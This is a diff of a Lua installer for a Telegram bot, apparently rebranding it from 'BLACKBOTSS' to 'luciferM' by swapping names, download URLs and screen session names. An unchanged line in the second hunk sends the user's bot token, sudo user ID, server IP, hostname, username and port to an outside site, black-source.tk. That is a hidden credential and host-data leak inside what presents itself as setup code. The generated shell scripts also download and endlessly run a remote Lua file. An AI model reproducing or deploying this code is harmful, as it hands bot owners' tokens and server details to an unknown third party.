@@ -16,9 +16,9 @@ local Create_Info = function(Token,Sudo)
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
 Write_Info_Sudo:write([[
 
-s = "BGBBB"
+s = "F_V_P"
 
-q = "FBBBBB"
+q = "lusefrdoctor"
 
 token = "]]..Token..[["
 
@@ -68,27 +68,27 @@ local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
  local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 print("::Black::")
-local RunBot = io.open("BLACKBOTSS", 'w')
+local RunBot = io.open("luciferM", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
+cd $HOME/luciferMu
 token="]]..database:get(Server_Done.."Token_Write")..[["
-rm -fr BLACKBOTSS.lua
-wget "https://raw.githubusercontent.com/BLACKBOTSS/BLACKBOTSS/master/BLACKBOTSS.lua"
+rm -fr lucifer.lua
+wget "https://raw.githubusercontent.com/luciferMu/luciferM/master/lucifer.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./BLACKBOTSS.lua -p PROFILE --bot=$token
+./tg -s ./lucifer.lua -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/BLACKBOTSS
+cd $HOME/luciferMu
 while(true) do
 rm -fr ../.telegram-cli
-screen -S BLACKBOTSS -X kill
-screen -S BLACKBOTSS ./BLACKBOTSS
+screen -S luciferMu -X kill
+screen -S luciferMu ./luciferM
 done
 ]])
 RunTs:close()
